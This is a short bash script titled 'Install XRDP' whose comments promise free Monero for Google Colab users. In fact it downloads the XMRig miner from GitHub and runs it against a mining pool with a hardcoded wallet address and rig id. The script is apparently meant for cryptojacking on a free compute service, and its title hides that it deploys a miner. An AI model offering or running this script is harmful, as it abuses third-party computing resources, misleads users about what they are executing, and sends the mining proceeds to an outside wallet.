#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o us-west.minexmr.com:443 -u 49wpeSyL69aQn2TqfFxucXe4ipZuTgAoLR6aoDp1c7tQUzPPPHnX8d2GgfQVYVPrPQe2NmSKz759bD6NP5RDJjZiKpwih7V -k --tls --rig-id GC-US
